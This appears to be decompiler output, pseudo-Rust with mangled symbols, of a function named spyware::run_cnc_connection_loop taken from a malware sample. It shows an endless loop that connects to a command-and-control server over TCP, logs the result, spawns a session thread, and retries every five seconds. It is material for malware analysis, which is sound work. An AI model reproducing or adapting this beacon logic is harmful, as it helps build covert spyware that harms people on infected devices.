
  fn spyware::run_cnc_connection_loop::h099cfaaaff629944() -> !

{
    loop
    {
        let mut var_e0: *mut *mut c_void = &data_4b93a8;
        let var_d8_1: fn(arg1: *mut i64, arg2: *mut i64) -> i64 =
            _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h412b806372427b66;
        let var_d0_1: *mut c_void = &data_41281a;
        let var_c8_1: fn(arg1: *mut i16, arg2: *mut i8) -> u64 = core::fmt::num::imp::_$LT$impl$u20$core..fmt..Display$u20$for$u20$u16$GT$::fmt::hca7847b10460df25;
        let mut var_110: *mut c_void = &data_4b9348;
        let var_108_1: i64 = 2;
        let var_f0_1: i64 = 0;
        let var_100_1: *const *mut *mut c_void = &var_e0;
        let var_f8_1: i64 = 2;
        let mut var_60: i128;
        core::option::Option$LT$T$GT$::map_or_else::h31b26472792d6da3(&var_60, &var_110);
        let mut var_78: i128 = var_60;
        let var_50: i64;
        let var_68_1: i64 = var_50;
        let mut var_a8: i8;
        std::net::tcp::TcpStream::connect::h95ced5f18ca8792f(&var_a8, &var_78);
        let mut var_b8: *mut *mut i128;
        let mut var_98: *mut *mut i128;
        let mut var_48: *mut i128;
        
        if (var_a8 & 1) == 0
        {
            let var_a4: i32;
            let mut var_114: i32 = var_a4;
            
            if core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 3
            {
                std::net::tcp::TcpStream::peer_addr::h9ccf6949693ba95c(&var_110, &var_114);
                core::result::Result$LT$T$C$E$GT$::unwrap::hde1314fe5351d8d1(&var_98, &var_110);
                _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::hb4d4415e985a544c(&var_48, &var_98);
                var_b8 = &var_48;
                let var_b0_1: fn(arg1: *mut c_void, arg2: *mut i64) -> i64 = _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h9e2c9c436a613463;
                var_110 = &data_4b9368;
                let var_108_3: i64 = 2;
                let var_f0_3: i64 = 0;
                let var_100_3: *mut *mut *mut i128 = &var_b8;
                let var_f8_3: i64 = 1;
                let rax_7: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b93d0);
                var_e0 = "spyware:Successfully connected t…";
                let var_d8_3: i64 = 7;
                let var_d0_3: *const i8 = "spyware:Successfully connected t…";
                let var_c8_3: i64 = 7;
                let var_c0_2: i64 = rax_7;
                log::__private_api::log::h13afddf373bd7d7f(&var_110, 3, &var_e0);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h46afe0b9deda2fc5(&var_48);
            }
            
            let var_100_4: i64 = -0x8000000000000000;
            var_110 = nullptr;
            let var_e8_1: i8 = 0;
            std::thread::Builder::spawn_unchecked::h9fd01dc985f8c9d4(&var_e0, &var_110);
            core::result::Result$LT$T$C$E$GT$::expect::h0214701cb0e2f56b(&var_110, &var_e0);
            core::ptr::drop_in_place$LT$std..thread..JoinHandle$LT$core..result..Result$LT$$LP$$RP$$C$std..io..error..Error$GT$$GT$$GT$::hc1f2d39e06124517(&var_110);
        }
        else
        {
            let var_a0: *mut *mut i128;
            var_b8 = var_a0;
            
            if core::sync::atomic::atomic_load::h8c88032dab18ab12() != 0
            {
                var_48 = &var_78;
                var_98 = &var_48;
                let var_90_1: fn(arg1: *mut i64, arg2: *mut i64) -> i64 =
                    _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h5f99fd476a35f039;
                let var_88_1: *mut i64 = &var_b8;
                let var_80_1: fn(arg1: *mut i64, arg2: *mut i64) -> i64 = _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
                var_110 = &data_4b9388;
                let var_108_2: i64 = 2;
                let var_f0_2: i64 = 0;
                let var_100_2: *mut *mut *mut i128 = &var_98;
                let var_f8_2: i64 = 2;
                let rax_4: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9400);
                var_e0 = "spyware:Successfully connected t…";
                let var_d8_2: i64 = 7;
                let var_d0_2: *const i8 = "spyware:Successfully connected t…";
                let var_c8_2: i64 = 7;
                let var_c0_1: i64 = rax_4;
                log::__private_api::log::h13afddf373bd7d7f(&var_110, 1, &var_e0);
            }
            
            core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&var_b8);
        }
        std::thread::sleep::h1a6eeffe1c923e1f(5, 0);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h46afe0b9deda2fc5(&var_78);
    }
}
